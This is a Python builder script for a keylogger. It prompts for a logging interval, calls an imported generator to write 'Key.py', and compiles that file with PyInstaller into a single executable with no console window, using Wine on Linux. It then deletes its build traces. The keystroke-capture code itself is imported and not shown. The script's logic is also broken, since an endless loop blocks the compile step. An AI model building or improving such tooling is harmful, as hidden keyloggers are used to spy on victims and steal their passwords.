# -*- coding: utf-8 -*-
import os
import sys
from Utils.generator import build_t
from Utils.banne_r import banner
from shutil import rmtree
from subprocess import call
from os import system, name, remove

if name == "nt":
    system("cls")
else:
    system("clear")

print(banner)


class KeyLogger:
    def __init__(self):
        self.filenampackeg = "Key.py"

    def setup_logger(self):
        #self.token = input("Enter Token (not needed, press Enter): ")
        self.time_interval = input("Enter Time Interval in minutes (default 1 min): ")
        self.time_interval = int(self.time_interval) if self.time_interval.isdigit() else 1
        build_t(self.time_interval)  # Starts keylogging
        print("Keylogger is running... Press Ctrl + C to stop.")
        while True:
            pass  # Keeps script running


    def cleanup(self):
        try:
            self.file = self.filenampackeg.split(".")[-2]
            self.spfile = self.file + ".spec"
            if os.path.exists(self.filenampackeg):
                remove(self.filenampackeg)
            if os.path.exists(self.spfile):
                remove(self.spfile)
            rmtree("__pycache__", ignore_errors=True)
            rmtree("build", ignore_errors=True)
        except Exception as e:
            print(f"Cleanup Error: {e}")

    def compile_exe(self):
        print("Compiling Python script to EXE...")
        system(f"pyinstaller --onefile --noconsole {self.filenampackeg}")
        self.cleanup()
        system("cls")

    def compile_exe_linux(self):
        wine_prefix = os.getenv("WINEPREFIX", "~/.wine")
        pyinstaller_path = os.path.expanduser(f"{wine_prefix}/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe")
        
        if not os.path.exists(pyinstaller_path):
            print("Error: PyInstaller not found in Wine environment.")
            return
        
        compile_command = ["wine", pyinstaller_path, "--onefile", "--noconsole", self.filenampackeg]
        call(compile_command)
        self.cleanup()
        system("clear")

    def start(self):
        self.setup_logger()
        if name == "nt":
            self.compile_exe()
        else:
            self.compile_exe_linux()


if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
    
